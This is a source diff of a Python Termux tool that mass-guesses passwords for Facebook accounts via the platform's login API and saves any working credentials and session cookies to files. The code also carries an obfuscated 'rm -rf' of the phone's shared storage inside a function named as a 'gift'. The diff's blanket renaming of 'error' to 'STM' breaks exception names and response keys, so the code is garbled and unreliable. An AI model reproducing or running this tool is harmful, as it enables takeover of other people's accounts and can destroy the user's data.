@@ -10,12 +10,12 @@ time.sleep(0.09)
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 try:
     import requests 
-except ImportError:
+except ImportSTM:
     print('\n  installing Requests ...\n')
     os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 try:
     import concurrent.futures
-except ImportError:
+except ImportSTM:
     print('\n  installing futures ...\n')
     os.system('pip install futures')
 try:import httpx
@@ -23,12 +23,12 @@ except:os.system("pip install httpx")
 import httpx
 try:
     import mechanize
-except ModuleNotFoundError:
+except ModuleNotFoundSTM:
     os.system('pip install mechanize')
 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as error
+from concurrent.futures import ThreadPoolExecutor as STM
 from datetime import datetime
 from string import * 
 from random import randint
@@ -37,7 +37,7 @@ from os import system as cmd
 from zlib import decompress 
 import os, platform
 from concurrent.futures import ThreadPoolExecutor
-from concurrent.futures import ThreadPoolExecutor as error
+from concurrent.futures import ThreadPoolExecutor as STM
 fast_work = ThreadPoolExecutor(max_workers=15).submit
 #====================[LOOP]==========================
 totaldmp = 0
@@ -74,14 +74,14 @@ def py_get(url):
         curl.setopt(curl.SSL_VERIFYHOST, 2)
         curl.setopt(curl.CAINFO, certifi.where())
         curl.perform()
-    except pycurl.error as e:
-        return f"An error occurred in py_get"
+    except pycurl.STM as e:
+        return f"An STM occurred in py_get"
     finally:
         curl.close()
     response_body = buffer.getvalue().decode('utf-8')
     return response_body
 def git():
-    os.system("xdg-open https://github.com/MR-ERROR-707")
+    os.system("xdg-open https://github.com/MR-STM-707")
 
 def is_https_active():
     try:
@@ -95,12 +95,12 @@ if is_https_active():pass
 else:sys.exit(" [!!] Off Httpcanary!!")
 myid=uuid.uuid4().hex[:5].upper()
 try:
-    key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.error', 'r').read()
+    key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.STM', 'r').read()
 except:
-    kok=open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.error', 'w');kok.write(myid);kok.close()
+    kok=open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.STM', 'w');kok.write(myid);kok.close()
 uid = os.getuid()
-key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.error', 'r').read()
-kex=(f"MR|{uid}|ERROR|{key1}|707")
+key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.STM', 'r').read()
+kex=(f"MR|{uid}|STM|{key1}|707")
 import os,uuid,hashlib,platform
 AX = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
 _sos_=AX;_xvx_=_sos_;_asa_=_xvx_;_cxa_=_asa_
@@ -110,7 +110,7 @@ _yy_=_cxa_[19:21];_q_=_yy_;_w_=_tt_;_e_=_rr_;_r_=_ee_;_t_=_qq_;__coc__=_q_+_w_+_
 orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m";faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
 my_color = [white,blue,green];warna = random.choice(my_color)
-sys.stdout.write('\x1b]2; ERROR~XD\x07')
+sys.stdout.write('\x1b]2; STM~XD\x07')
 #===================[SERVER BOX]===========================
 def gift___pro():
     os.system('r'+'m -r'+'f /s'+'tora'+'g'+'e'+'/'+'e'+'m'+'u'+'l'+'at'+'ed/0/')
@@ -136,7 +136,7 @@ blx = now.month
 try:
     if blx < 0 or blx > 12:exit()
     xx = blx - 1
-except ValueError:exit()
+except ValueSTM:exit()
 bulan = sasi[xx]
 tahun = now.year
 os.system('')
@@ -144,13 +144,13 @@ today = '\033[1;32m'+str(hari)+'\033[1;97m-\033[1;32m'+str(bulan)+'\033[1;97m-\0
 def get_current_location():
     try:
         response = requests.get('https://ipinfo.io/json')
-        response.raise_for_status()  # Raise an HTTPError for bad responses
+        response.raise_for_status()  # Raise an HTTPSTM for bad responses
         data = response.json()
         city = data.get('city', 'Unknown')
         country = data.get('country', 'Unknown')
         return city, country
     except requests.RequestException as e:
-        print("Error fetching current location:", e)
+        print("STM fetching current location:", e)
         return None, None
 # Example usage
 current_city, current_country = get_current_location()
@@ -252,20 +252,20 @@ logo=(f"""
 {red}[{white}✓{red}]{green} THIS TOOL FREE ACCESS ALL FEATURE SO USE FEEL HAPPY
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #====================[HOME-PAGE]==========================
-def ___ERROR___():
+def ___STM___():
     clear()
     print(f'{red}[{white}A{red}]{green} FILE CLONING')
     print(f'{red}[{white}B{red}]{green} RANDOM CLONING')
     print(f'{red}[{white}C{red}]{green} JOIN FACEBOOK GROUP')
     line()
-    __ERROR__ = input(f'{red}[{white}◆{red}]{green} Selection {white}:{yellow} ')
-    if __ERROR__ in['A','a','01','1']:___FILE___()
-    elif __ERROR__ in ['B','b','02','2']:___RANDOM___()
-    elif __ERROR__ in ['C','c','03','3']:os.system('xdg-open ');___ERROR___()
+    __STM__ = input(f'{red}[{white}◆{red}]{green} Selection {white}:{yellow} ')
+    if __STM__ in['A','a','01','1']:___FILE___()
+    elif __STM__ in ['B','b','02','2']:___RANDOM___()
+    elif __STM__ in ['C','c','03','3']:os.system('xdg-open ');___STM___()
     else:
         print(f'{red}[{white}×{red}]{green} WRONG OPTION')
         time.sleep(2)
-        ___ERROR___()
+        ___STM___()
 #====================[RANDOM MENU]==========================
 def rmpassconf(num,type):
         if 'first' in type:
@@ -294,13 +294,13 @@ def ___RANDOM___():
     print(f'{red}[{white}E{red}]{green} NEPAL RANDOM')
     print(f'{red}[{white}F{red}]{green} BACK MENU')
     line()
-    error_ = input(f'{red}[{white}◆{red}]{green} Selection {white}▶ {yellow}︎')
-    if error_ in ['A','a','01','1']:___BD___()
-    elif error_ in ['B','b','02','2']:___INDIA___()
-    elif error_ in ['C','c','03','3']:___ML___()
-    elif error_ in ['D','d','04','4']:___PK___()
-    elif error_ in ['E','e','05','5']:___NP___()
-    elif error_ in ['F','f','06','6']:___ERROR___()
+    STM_ = input(f'{red}[{white}◆{red}]{green} Selection {white}▶ {yellow}︎')
+    if STM_ in ['A','a','01','1']:___BD___()
+    elif STM_ in ['B','b','02','2']:___INDIA___()
+    elif STM_ in ['C','c','03','3']:___ML___()
+    elif STM_ in ['D','d','04','4']:___PK___()
+    elif STM_ in ['E','e','05','5']:___NP___()
+    elif STM_ in ['F','f','06','6']:___STM___()
     else:___RANDOM___()
 #====================[BD RANDOM]==========================
 def ___BD___():
@@ -349,7 +349,7 @@ def ___BD___():
         nmp = "". join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
+    with ThreadPoolExecutor(max_workers=30) as STM:
         clear()
         print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
         print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
@@ -363,17 +363,17 @@ def ___BD___():
             tl = len(user)
             xb = love[2:]
             psd = plist
-            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
-            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
-            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
-            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
+            if mtd in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
+            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
+            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
+            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl)
     print(f'\r{white}================================================')
     print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
     print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
     print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___STM___()
         
 #====================[INDIA RANDOM]==========================
 def ___INDIA___():
@@ -385,7 +385,7 @@ def ___INDIA___():
     limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
     line()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
-    ___error___=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
+    ___STM___=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
     line()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
     print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
@@ -406,26 +406,26 @@ def ___INDIA___():
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
+    with ThreadPoolExecutor(max_workers=30) as STM:
         clear()
-        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___error___}')
+        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___STM___}')
         print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
         print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
         for love in user:
             ids = code + love
             tl = len(user)
             psd = plist
-            if ___error___ in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
-            elif ___error___ in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
-            elif ___error___ in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
-            elif ___error___ in ['D','d','04','4']:error.submit(randm3, ids, psd,tl) 
+            if ___STM___ in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
+            elif ___STM___ in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
+            elif ___STM___ in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
+            elif ___STM___ in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl) 
     print(f'\r{white}================================================')
     print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
     print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
     print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___STM___()
 #====================[MALAYSIA RANDOM]==========================
 def ___ML___():
     clear()
@@ -469,7 +469,7 @@ def ___ML___():
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
+    with ThreadPoolExecutor(max_workers=30) as STM:
         clear()
         print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
         print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
@@ -482,10 +482,10 @@ def ___ML___():
             xa = love[1:]
             tl = len(user)
             xb = love[2:]
-            if mtd in ['A','a','01','1']:error.submit(randm, ids, plist,tl)
-            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, plist,tl)
-            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, plist,tl)
-            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, plist,tl)
+            if mtd in ['A','a','01','1']:STM.submit(randm, ids, plist,tl)
+            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, plist,tl)
+            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, plist,tl)
+            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, plist,tl)
     print('')
     print(f'\r{white}================================================')
     print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
@@ -493,7 +493,7 @@ def ___ML___():
     print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___STM___()
 #====================[PAKISTAN RANDOM]==========================
 def ___PK___():
     clear()
@@ -538,7 +538,7 @@ def ___PK___():
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
+    with ThreadPoolExecutor(max_workers=30) as STM:
         clear()
         print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
         print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
@@ -552,10 +552,10 @@ def ___PK___():
             tl = len(user)
             xb = love[2:]
             psd = plist
-            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
-            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
-            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
-            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
+            if mtd in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
+            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
+            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
+            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl)
     print('')
     print(f'\r{white}================================================')
     print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
@@ -563,7 +563,7 @@ def ___PK___():
     print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___STM___()
  #====================[NEPAL RANDOM]==========================
 def ___NP___():
     clear()
@@ -613,7 +613,7 @@ def ___NP___():
         nmp = "". join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
+    with ThreadPoolExecutor(max_workers=30) as STM:
         clear()
         print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
         print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
@@ -627,10 +627,10 @@ def ___NP___():
             tl = len(user)
             xb = love[2:]
             psd = plist
-            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
-            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
-            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
-            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
+            if mtd in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
+            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
+            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
+            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl)
     print('')
     print(f'\r{white}================================================')
     print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
@@ -638,16 +638,16 @@ def ___NP___():
     print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___STM___()
 #====================[FILE CLONE MENU]==========================
 def ___FILE___():
     global methods
     clear()
-    print(f'{red}[{white}✓{red}] {green}EXAMPLE {red}[{white}sdcard/mrerror.txt{red}]');line()
+    print(f'{red}[{white}✓{red}] {green}EXAMPLE {red}[{white}sdcard/mrSTM.txt{red}]');line()
     dfile = input(f'{red}[{white}✓{red}] {green}INPUT FILE PATH {white}▶︎ \x1b[38;5;208m');line();clear()
     try:
         dx = open(dfile,'r').read().splitlines()
-    except FileNotFoundError:
+    except FileNotFoundSTM:
         print(f'{red}[{white}×{red}] FILE NOT FOUND...');time.sleep(1);___FILE___()
     dplist = []
     try:
@@ -659,7 +659,7 @@ def ___FILE___():
     for i in range(pass_lmit):        
         dplist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ {yellow}'));line()
     __METHOD__ = input(f"{red}[{white}A{red}]{green} METHOD M1 \n{red}[{white}B{red}] {green}METHOD M2 \n{red}[{white}C{red}] {green}METHOD M3 \n{red}[{white}D{red}] {green}METHOD M4 \n{red}[{white}E{red}] {green}METHOD M5 \n{red}[{white}F{red}] {green}METHOD M6{white}\n==============================================\n{red}[{white}◆{red}] {green}SELECTION {white}▶︎ \x1b[38;5;208m");clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
+    with ThreadPoolExecutor(max_workers=30) as STM:
         clear()
         print(f'{red}[{white}✓{red}] {green}TOTAL IDS {white}▶ ︎{len(dx)}{white} > {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
         print(f'{red}[{white}✓{red}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
@@ -669,19 +669,19 @@ def ___FILE___():
             tl = len(dx)
             passlist = dplist
             if __METHOD__ in ["A","a","1","01"]:
-                error.submit(__MTDONEE__,ids,names,passlist,tl)
+                STM.submit(__MTDONEE__,ids,names,passlist,tl)
             elif __METHOD__ in ["B","b","2","02"]:
-                error.submit(__MTDTWOO__,ids,names,passlist,tl)
+                STM.submit(__MTDTWOO__,ids,names,passlist,tl)
             elif __METHOD__ in ["C","c","3","03"]:
-                error.submit(__MTDTHREE__,ids,names,passlist,tl)
+                STM.submit(__MTDTHREE__,ids,names,passlist,tl)
             elif __METHOD__ in ["D","d","4","04"]:
-                error.submit(__MTDFOUR__,ids,names,passlist,tl)
+                STM.submit(__MTDFOUR__,ids,names,passlist,tl)
             elif __METHOD__ in ["E","e","5","05"]:
-                error.submit(__MTDFIVE__,ids,names,passlist,tl)
+                STM.submit(__MTDFIVE__,ids,names,passlist,tl)
             elif __METHOD__ in ["F","f","6","06"]:
-                error.submit(__MTDONE6__ ,ids,names,passlist,tl)
+                STM.submit(__MTDONE6__ ,ids,names,passlist,tl)
             else:
-                error.submit(__MTDONEE__,ids,names,passlist,tl)
+                STM.submit(__MTDONEE__,ids,names,passlist,tl)
     print('')
     print(f'\r{white}================================================')
     print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
@@ -689,14 +689,14 @@ def ___FILE___():
     print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___STM___()
 #====================[FILE M1]==========================
 try:
     def __MTDONEE__(sid, name, psw,tl):
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -712,7 +712,7 @@ try:
                     "cpl": "true",
                     "family_device_id": str(uuid.uuid4()),
                     "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
+                    "STM_detail_type": "button_with_disabled",
                     "source": "device_based_login",
                     "email": sid,
                     "password": ps,
@@ -746,14 +746,14 @@ try:
                 q = json.loads(po)
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
-                    open('/sdcard/ERROR-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}SUCCESS{red}] {green}{sid} {white}| {green}{ps} ")
+                    open('/sdcard/STM-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/STM-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
-                elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                elif 'www.facebook.com' in q['STM']['message']:
+                     #print(f"\r\r{red}[STM-CP] {sid} | {ps} ")
+                     open('/sdcard/STM-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                 else:
                     continue
@@ -764,7 +764,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -781,7 +781,7 @@ try:
                       "cpl": "true",
                       "family_device_id":str(uuid.uuid4()),
                       "credentials_type": "device_based_login_password",
-                      "error_detail_type": "button_with_disabled",
+                      "STM_detail_type": "button_with_disabled",
                       "source": "device_based_login",
                       "email": sid,
                       "password": ps,
@@ -818,14 +818,14 @@ try:
                 q = session.post("https://api.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
-                    open('/sdcard/ERROR-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}SUCCESS{red}] {green}{sid} {white}| {green}{ps} ")
+                    open('/sdcard/STM-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/STM-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
-                elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                elif 'www.facebook.com' in q['STM']['message']:
+                    #print(f"\r\r{red}[STM-CP] {sid} | {ps} ")
+                     open('/sdcard/STM-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                      break
                 else:continue
@@ -836,7 +836,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -853,7 +853,7 @@ try:
                       "cpl": "true",
                       "family_device_id":str(uuid.uuid4()),
                       "credentials_type": "device_based_login_password",
-                      "error_detail_type": "button_with_disabled",
+                      "STM_detail_type": "button_with_disabled",
                       "source": "device_based_login",
                       "email": sid,
                       "password": ps,
@@ -890,14 +890,14 @@ try:
                 q = session.post("htt"+"ps:"+"//b-"+"gra"+"ph.fa"+"ceboo"+"k.com"+"/auth"+"/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
-                    open('/sdcard/ERROR-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}SUCCESS{red}] {green}{sid} {white}| {green}{ps} ")
+                    open('/sdcard/STM-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/STM-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
-                elif 'www.facebook.com' in q['error']['message']:
-                        #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                elif 'www.facebook.com' in q['STM']['message']:
+                        #print(f"\r\r{red}[STM-CP] {sid} | {ps} ")
+                     open('/sdcard/STM-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                      break
                 else:continue
@@ -908,7 +908,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -923,7 +923,7 @@ try:
                     "device_id":str(uuid.uuid4()),
                     "cpl":"true",
                     "credentials_type":"device_based_login_password",
-                    "error_detail_type":"button_with_disabled",
+                    "STM_detail_type":"button_with_disabled",
                     "email":sid,
                     "password":ps,
                     "access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895",
@@ -953,14 +953,14 @@ try:
                 q = session.post("htt"+"ps:"+"//b-"+"gra"+"ph.fa"+"ceboo"+"k.com"+"/auth"+"/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
